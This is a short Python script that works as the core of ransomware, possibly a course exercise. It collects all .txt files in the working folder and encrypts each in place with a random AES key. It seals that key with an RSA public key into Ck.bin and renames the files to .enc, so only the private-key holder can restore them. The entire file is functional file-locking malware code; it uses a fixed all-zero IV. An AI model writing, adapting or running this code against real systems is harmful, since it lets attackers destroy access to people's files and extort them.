#!/usr/bin/env python3
import glob
import sys
import subprocess
from Crypto.PublicKey import RSA
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import os

def change_file_extension(file_path, new_extension):
    file_name, old_extension = os.path.splitext(file_path)
    new_file_path = file_name + new_extension
    os.rename(file_path, new_file_path)
    return new_file_path

#read folder to get all txt files
file_list = []
for item in glob.glob("*.txt"):
 file_list.append(item)
 


key = get_random_bytes(16) #128bit
pk = RSA.import_key(open("receiver1.pem").read()) #recipient key = public key, get public key
file_out = open("Ck.bin", "wb") #create new file for cipher key

cipher_rsa = PKCS1_OAEP.new(pk) #specify version for encryption and decryption
Ck = cipher_rsa.encrypt(key) #encrypt the symmetric key
file_out.write(Ck) #store encrypted key in the file Ck.bin
file_out.close()

iv = b'\x00' * 16

for item in file_list:
 file_in = open(item,'r+b') #open file to read contents
 all_contents = file_in.read()
 
 cipher = AES.new(key, AES.MODE_CBC, iv)
 
 CM_bytes = cipher.encrypt(pad(all_contents, AES.block_size)) #encrypt the message with  the symmetric key


 file_in.seek(0) #remove exisiting content
 file_in.write(CM_bytes)
 print('Encrypted', item)
 
for item in file_list:
 new_extension = '.enc'
 new_file_name = change_file_extension(item, new_extension)
 




